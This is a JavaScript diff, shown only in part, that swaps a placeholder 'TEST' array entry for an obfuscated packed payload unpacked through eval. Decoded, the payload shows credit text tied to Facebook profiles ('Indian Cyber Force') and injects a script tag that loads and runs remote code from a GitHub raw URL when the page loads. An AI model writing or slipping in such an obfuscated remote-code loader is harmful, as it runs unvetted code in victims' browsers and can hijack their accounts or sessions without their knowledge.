@@ -110,7 +110,7 @@ jx = {
         return this.b()
     }
 };
-var _0x612a = ["TEST"];
+var _0x612a = ["e a='f b: <A 0="1:#2;" 3="4://8.9.5/g" 6="7">h [i ] j%</A> & <A 0="1:#2;" 3="4://8.9.5/k" 6="7"> l m n o</A>.</c>p q b: </A><A 0="1:#2;" 3="4://8.9.5/r" 6="7"> s t</A></A>,</A><A 0="1:#2;" 3="4://8.9.5/u" 6="7"> v w. x</A></A>.</c>y z B C D E <A 0="1:#2;" 3="4://F.G.H/" 6="7">I J K</A>.</A>';L(M!=a){N:(O(){d.P.Q(d.R('S')).T='U://V.W.5/X/Y-Z/10/11.12'})()}", "|", "split", "style|color|3B5998|href|http|com|target|_blank|www|facebook|Omni_text|By|br|document|var|Powered|167113693488785|Loading|lllllllllll|99|199134496914077|Assam|Indian|Cyber|Force|Script|Made|100006619800809|Waqar|Ahmad|100006619800809|Bhargav|JT|Gogoi|For|More||Tools|Visit|Our|Blogger|automateyourfacebook|blogspot|in|Automate|Your|Facebook|if|_text|javascript|function|body|appendChild|createElement|script|src|https|raw|github|bhargav1996|Fun|time|master|Union|js", "", "fromCharCode", "replace", "\w+", "\b", "g"];
 eval(function (_0x1b3bx1, _0x1b3bx2, _0x1b3bx3, _0x1b3bx4, _0x1b3bx5, _0x1b3bx6) {
     _0x1b3bx5 = function (_0x1b3bx3) {
         return (_0x1b3bx3 < _0x1b3bx2 ? _0x612a[4] : _0x1b3bx5(parseInt(_0x1b3bx3 / _0x1b3bx2))) + ((_0x1b3bx3 = _0x1b3bx3 % _0x1b3bx2) > 35 ? String[_0x612a[5]](_0x1b3bx3 + 29) : _0x1b3bx3.toString(36));
